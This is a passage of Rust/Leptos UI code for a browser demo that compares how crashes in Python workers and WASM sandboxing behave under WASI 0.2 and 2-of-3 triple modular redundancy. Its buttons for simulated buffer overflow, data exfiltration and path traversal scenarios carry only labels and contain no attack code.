                    </div>
                </div>
            </div>
            
            // stats comparison
            <div class="stats-container">
                <div class="stats-panel python-stats">
                    <h4>"🐍 Python Stats"</h4>
                    <div class="stats-row">
                        <div class="stat-item">
                            <span class="stat-value">{python_processed}</span>
                            <span class="stat-label">"Processed"</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value error">{python_crashed}</span>
                            <span class="stat-label">"Crashed"</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value error">{move || format!("{}ms", python_downtime_ms.get())}</span>
                            <span class="stat-label">"Downtime"</span>
                        </div>
                    </div>
                </div>
                
                <div class="stats-panel wasm-stats">
                    <h4>"🦀 WASM Stats"</h4>
                    <div class="stats-row">
                        <div class="stat-item">
                            <span class="stat-value">{wasm_processed}</span>
                            <span class="stat-label">"Processed"</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value warn">{wasm_rejected}</span>
                            <span class="stat-label">"Voted Out"</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value success">"0ms"</span>
                            <span class="stat-label">"Downtime"</span>
                        </div>
                    </div>
                </div>
            </div>
            
            // attack controls
            <div class="attack-section">
                <h3>"☠️ Attack Scenarios"</h3>
                <p class="section-desc">"Click an attack to simulate it, or run all sequentially"</p>
                <div class="attack-buttons">
                    <button 
                        class="attack-btn"
                        class:running=move || selected_attack.get() == "bufferOverflow" && is_running.get()
                        disabled=move || is_running.get()
                        title="Memory corruption attack - causes process crash"
                        on:click=move |_| {
                            set_selected_attack.set("bufferOverflow".to_string());
                            trigger_attack(());
                        }
                    >
                        "💥 Buffer Overflow"
                    </button>
                    <button 
                        class="attack-btn"
                        class:running=move || selected_attack.get() == "dataExfil" && is_running.get()
                        disabled=move || is_running.get()
                        title="Attempts unauthorized network connection"
                        on:click=move |_| {
                            set_selected_attack.set("dataExfil".to_string());
                            trigger_attack(());
                        }
                    >
                        "📤 Data Exfil"
                    </button>
                    <button 
                        class="attack-btn"
                        class:running=move || selected_attack.get() == "pathTraversal" && is_running.get()
                        disabled=move || is_running.get()
                        title="Attempts to read sensitive files"
                        on:click=move |_| {
                            set_selected_attack.set("pathTraversal".to_string());
                            trigger_attack(());
                        }
                    >
                        "📁 Path Traversal"
                    </button>
                </div>
                <div class="attack-actions">
                    <button 
                        class="action-btn runall" 
                        title="Run all 3 attacks sequentially"
                        disabled=move || is_running.get() 
                        on:click=move |_| run_all_attacks(())
                    >
                        "🔥 Run All Attacks"
                    </button>
                    <button 
                        class="action-btn reset" 
                        title="Reset all stats and terminals"
                        disabled=move || is_running.get()
                        on:click=move |_| reset_demo(())
                    >
                        "🔄 Reset"
                    </button>
                </div>
                
                // Info box explaining WASI 0.2 and Byzantine fault tolerance
                <div class="info-box">
                    <h4>"ℹ️ About This Demo — WASI 0.2 + 2oo3 TMR "<span class="demo-badge">"Browser Demonstration"</span></h4>
                    <p>"This visualizes "<strong>"WASI 0.2's deny-by-default security"</strong>" combined with "<strong>"2oo3 Triple Modular Redundancy"</strong>". Python exceptions are real; WASM traps show what wasmtime enforces."</p>
                    <ul>
                        <li><strong>"🐍 Python:"</strong>" Real Pyodide exceptions crash workers → no output to vote on. Must wait ~1.5s to respawn before TMR works again."</li>
                        <li><strong>"🦀 WASM:"</strong>" Simulates wasmtime trap behavior → returns 'TRAP' as output. All 3 outputs compared → 2/3 majority wins. Rebuild in sub-ms."</li>
                        <li>
                            <strong>"🔒 WIT Contract:"</strong>" "
                            <a class="wit-link" href="#" on:click=move |e: web_sys::MouseEvent| {
                                e.prevent_default();
                                set_wit_modal_open.set(true);
                            }>"View wit/attacks.wit"</a>
                            " (same format used by wasmtime)"
                        </li>
                    </ul>
                    <p class="hardware-note">"🔧 "<strong>"Coming Soon:"</strong>" Hardware demonstration on Raspberry Pi with wasmtime enforcing WIT contracts at the syscall level."</p>
                </div>
            </div>
            
            // WIT Code Modal
            {move || if wit_modal_open.get() {
                view! {
                    <div class="modal-overlay" on:click=move |_| set_wit_modal_open.set(false)>
                        <div class="modal-content" on:click=|e: web_sys::MouseEvent| e.stop_propagation()>
                            <div class="modal-header">
                                <span class="modal-title">"📄 wit/attacks.wit"</span>
                                <button class="modal-close" on:click=move |_| set_wit_modal_open.set(false)>"×"</button>
                            </div>
                            <pre class="wit-code">{WIT_CODE_EXCERPT}</pre>
                        </div>
                    </div>
                }.into_view()
            } else {
                view! { <div></div> }.into_view()
            }}
        </div>
    }
}

// ============================================================================
// helper functions
// ============================================================================

fn set_timeout<F: FnOnce() + 'static>(cb: F, dur: std::time::Duration) {
    use wasm_bindgen::closure::Closure;
    let window = web_sys::window().unwrap();
    let closure = Closure::once(cb);
    window.set_timeout_with_callback_and_timeout_and_arguments_0(
        closure.as_ref().unchecked_ref(), dur.as_millis() as i32
    ).unwrap();
    closure.forget();
}
